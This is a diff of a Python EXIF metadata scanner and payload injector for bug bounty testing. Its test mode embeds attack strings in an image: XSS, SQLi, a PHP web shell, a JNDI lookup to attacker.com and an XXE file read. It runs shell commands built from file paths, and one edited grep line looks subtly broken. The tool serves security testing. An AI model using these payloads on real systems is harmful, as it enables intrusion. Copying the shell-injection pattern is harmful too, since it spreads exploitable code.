@@ -1,11 +1,18 @@
 #!/usr/bin/env python3
 """
-Ultimate EXIFTron Bug Bounty Tool
+Ultimate EXIFTron Bug Bounty & PoC Tool (v5.4 - Bug Bounty Edition)
 
-This tool extracts and analyzes EXIF metadata from image files,
-detects vulnerabilities (XSS, SQLi, RCE, etc.) and PII,
-supports payload injection for PoCs, and generates detailed reports.
-It also includes a Flask dashboard mode for interactive viewing.
+Features:
+- Extract EXIF metadata from images using ExifTool.
+- Detect vulnerabilities: XSS, SQLi, RCE, XXE, LDAP Injection, SSTI, Hardcoded Credentials.
+- Detect PII (emails, phone numbers, GPS data, usernames, passwords).
+- Payload injection into specified metadata fields for PoC generation.
+- Batch processing with parallel execution.
+- Generates detailed CLI reports and saves results to a file.
+- Offers a custom web dashboard (Flask + Bootstrap) for interactive review.
+- Test mode to generate a sample image with preset payloads.
+
+Author: @Kdairatchi | Version: 5.4 (Bug Bounty Edition)
 """
 
 import os
@@ -21,7 +28,7 @@ from rich.console import Console
 from rich.panel import Panel
 from rich.table import Table
 
-# Try to import Flask for dashboard mode (if available)
+# Try to import Flask for dashboard mode
 try:
     from flask import Flask, render_template_string
 except ImportError:
@@ -32,10 +39,7 @@ console = Console()
 ROOT = Path(__file__).parent.resolve()
 DOWNLOAD_DIR = ROOT / "downloaded_images"
 
-# Global configuration for AI analysis (placeholder – update if using Groq API)
-GROQ_API_KEY = "YOUR_GROQ_API_KEY"  # Replace with your Groq API Key
-
-# --- Configuration for metadata fields, vulnerability & PII patterns ---
+# Global configuration for metadata fields, vulnerability, and PII patterns
 TARGET_FIELDS = [
     "File Name", "Artist", "Copyright", "Comment", "Software", "Make", "Model",
     "Owner Name", "User Comment", "Author", "Description", "Keywords", "Title",
@@ -69,11 +73,11 @@ INJECTION_PAYLOADS = {
     "XXE": "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"
 }
 
-# --- EXIFTron Class Definition ---
+# --- EXIFTron Class ---
 class EXIFTron:
     def __init__(self):
         self.payloads = INJECTION_PAYLOADS
-        self.report_data = []  # List of dictionaries with scan results
+        self.report_data = []  # List to store scan results
 
     def show_banner(self):
         banner = Panel(
@@ -84,16 +88,16 @@ class EXIFTron:
         console.print(banner)
 
     def extract_exif_data(self, image_path):
-        """Extract EXIF metadata using exiftool with grep for selected fields."""
+        """Extract EXIF metadata using exiftool and grep-like filtering."""
         try:
-            cmd = f'exiftool "{image_path}" | grep -E "{ "|".join(TARGET_FIELDS) }"'
+            cmd = f'exiftool "{image_path}" | grep -E "{ "|\n".join(TARGET_FIELDS) }"'
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout.strip()
             exif_data = {}
             for line in result.split("\n"):
                 if ": " in line:
                     key, value = line.split(": ", 1)
                     exif_data[key.strip()] = value.strip()
-            # Ensure Author is present: fallback to Artist if not explicitly set
+            # Ensure Author is set (fallback to Artist)
             exif_data["Author"] = exif_data.get("Author") or exif_data.get("Artist", "N/A")
             return exif_data
         except Exception as e:
@@ -101,7 +105,7 @@ class EXIFTron:
             return None
 
     def analyze_vulnerabilities(self, metadata):
-        """Detect vulnerability patterns in metadata fields."""
+        """Detect vulnerability patterns in metadata."""
         findings = []
         for field, content in metadata.items():
             for vuln_type, patterns in VULN_PATTERNS.items():
@@ -110,7 +114,7 @@ class EXIFTron:
         return findings
 
     def detect_pii(self, metadata):
-        """Detect PII in metadata fields."""
+        """Detect PII in metadata."""
         pii_findings = []
         for field, content in metadata.items():
             for pii_type, patterns in PII_PATTERNS.items():
@@ -121,7 +125,7 @@ class EXIFTron:
         return pii_findings
 
     def format_gps(self, lat, lon):
-        """Format GPS coordinates and return a Google Maps link."""
+        """Format GPS coordinates and generate a Google Maps link."""
         if lat == "N/A" or lon == "N/A":
             return "N/A", "N/A"
         try:
@@ -133,7 +137,7 @@ class EXIFTron:
             return "N/A", "N/A"
 
     def inject_payload(self, image_path, payload_type, field="Comment"):
-        """Inject a specified payload into the given EXIF metadata field."""
+        """Inject a payload into a specified EXIF field."""
         if payload_type not in self.payloads:
             console.print("[bold red]Invalid payload type! Valid types: XSS, SQLi, RCE, LDAP, XXE[/bold red]")
             return
@@ -143,7 +147,7 @@ class EXIFTron:
         subprocess.run(cmd, shell=True)
 
     def process_image(self, image_path):
-        """Process an image to extract metadata, detect vulnerabilities & PII, and prepare PoC info."""
+        """Process a single image: extract metadata, detect vulnerabilities & PII."""
         metadata = self.extract_exif_data(image_path)
         if not metadata:
             return None
@@ -161,7 +165,7 @@ class EXIFTron:
         }
 
     def batch_process(self, folder_path):
-        """Batch process images in a folder using parallel execution."""
+        """Batch process all images in a folder using parallel execution."""
         image_files = list(Path(folder_path).glob("*.jpg")) + \
                       list(Path(folder_path).glob("*.jpeg")) + \
                       list(Path(folder_path).glob("*.png"))
@@ -187,7 +191,6 @@ class EXIFTron:
         table.add_column("Name", style="magenta", overflow="fold")
         table.add_column("Software", style="yellow", overflow="fold")
         table.add_column("Permissions", style="bold", overflow="fold")
-
         for metadata in metadata_list:
             gps_coords, map_link = self.format_gps(metadata.get("GPS Latitude", "N/A"), metadata.get("GPS Longitude", "N/A"))
             vulnerabilities_text = ", ".join(metadata.get("vulnerabilities", [])) if metadata.get("vulnerabilities") else "None"
@@ -209,7 +212,7 @@ class EXIFTron:
                 f.write(f'{metadata.get("File", "Unknown")} | {vulnerabilities_text} | {metadata.get("PII", "None")} | {gps_coords} | {map_link} | {metadata.get("Name", "N/A")} | {metadata.get("Software", "N/A")} | {metadata.get("Permissions", "N/A")}\n')
         console.print("[bold green]✅ Scan completed. Results saved to exif_scan_results.txt[/bold green]")
 
-# --- Optional Dashboard using Flask ---
+# --- Custom Dashboard using Flask & Bootstrap ---
 def start_dashboard(results, host="0.0.0.0", port=5000):
     if not Flask:
         console.print("[bold red]Flask is not installed. Dashboard mode unavailable.[/bold red]")
@@ -217,47 +220,51 @@ def start_dashboard(results, host="0.0.0.0", port=5000):
     app = Flask(__name__)
     template = """
     <!doctype html>
-    <html>
-    <head>
+    <html lang="en">
+      <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
         <title>EXIFTron Bug Bounty Dashboard</title>
-        <style>
-            body { font-family: Arial, sans-serif; margin: 20px; }
-            table { border-collapse: collapse; width: 100%; }
-            th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
-            th { background-color: #f2f2f2; }
-        </style>
-    </head>
-    <body>
-        <h1>EXIFTron Bug Bounty Dashboard</h1>
-        <table>
-            <thead>
-                <tr>
-                    <th>File</th>
-                    <th>Vulnerabilities</th>
-                    <th>PII Found</th>
-                    <th>GPS Coordinates</th>
-                    <th>Map Link</th>
-                    <th>Name</th>
-                    <th>Software</th>
-                    <th>Permissions</th>
-                </tr>
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+      </head>
+      <body>
+        <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+          <a class="navbar-brand" href="#">EXIFTron Dashboard</a>
+        </nav>
+        <div class="container mt-4">
+          <h1 class="mb-4">Bug Bounty EXIF Security Report</h1>
+          <table class="table table-striped table-bordered">
+            <thead class="thead-dark">
+              <tr>
+                <th>File</th>
+                <th>Vulnerabilities</th>
+                <th>PII Found</th>
+                <th>GPS Coordinates</th>
+                <th>Map Link</th>
+                <th>Name</th>
+                <th>Software</th>
+                <th>Permissions</th>
+              </tr>
             </thead>
             <tbody>
-                {% for res in results %}
-                <tr>
-                    <td>{{ res["File"] }}</td>
-                    <td>{{ res["Vulnerabilities"] }}</td>
-                    <td>{{ res["PII"] }}</td>
-                    <td>{{ res["GPS"] }}</td>
-                    <td>{% if res["Map Link"] != "N/A" %}<a href="{{ res["Map Link"] }}" target="_blank">View Map</a>{% else %}N/A{% endif %}</td>
-                    <td>{{ res["Name"] }}</td>
-                    <td>{{ res["Software"] }}</td>
-                    <td>{{ res["Permissions"] }}</td>
-                </tr>
-                {% endfor %}
+              {% for res in results %}
+              <tr>
+                <td>{{ res["File"] }}</td>
+                <td>{{ res["Vulnerabilities"] }}</td>
+                <td>{{ res["PII"] }}</td>
+                <td>{{ res["GPS"] }}</td>
+                <td>{% if res["Map Link"] != "N/A" %}<a href="{{ res["Map Link"] }}" target="_blank">View Map</a>{% else %}N/A{% endif %}</td>
+                <td>{{ res["Name"] }}</td>
+                <td>{{ res["Software"] }}</td>
+                <td>{{ res["Permissions"] }}</td>
+              </tr>
+              {% endfor %}
             </tbody>
-        </table>
-    </body>
+          </table>
+        </div>
+        <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>
+      </body>
     </html>
     """
     @app.route("/")
@@ -291,12 +298,12 @@ def main():
     results = []
 
     if args.test:
-        # Create a test image with preset payloads for PoC demonstration
+        # Create a test image with preset payloads
         from PIL import Image
         img = Image.new('RGB', (800, 800), color='red')
         test_image = ROOT / "test_image.jpg"
         img.save(test_image)
-        payloads = {
+        test_payloads = {
             'Comment': '<script>alert("XSS")</script>',
             'Artist': "' OR 1=1 -- -",
             'Copyright': '<?php system($_GET["cmd"]); ?>',
@@ -305,7 +312,7 @@ def main():
             'Software': 'SecretApp v1.3.7',
             'Make': 'TestDevice ${jndi:ldap://attacker.com}'
         }
-        for field, value in payloads.items():
+        for field, value in test_payloads.items():
             subprocess.run([
                 'exiftool',
                 f'-{field}={value}',
@@ -324,11 +331,10 @@ def main():
         results = tool.batch_process(args.batch)
     elif args.payload and args.image:
         tool.inject_payload(Path(args.image), args.payload, args.field)
-        # Re-scan the image after injection
         res = tool.process_image(Path(args.image))
         if res:
             results.append(res)
-    # URL, domain, wayback scanning can be added later
+    # URL, domain, and wayback scanning can be implemented in future versions.
 
     if results:
         if args.report:
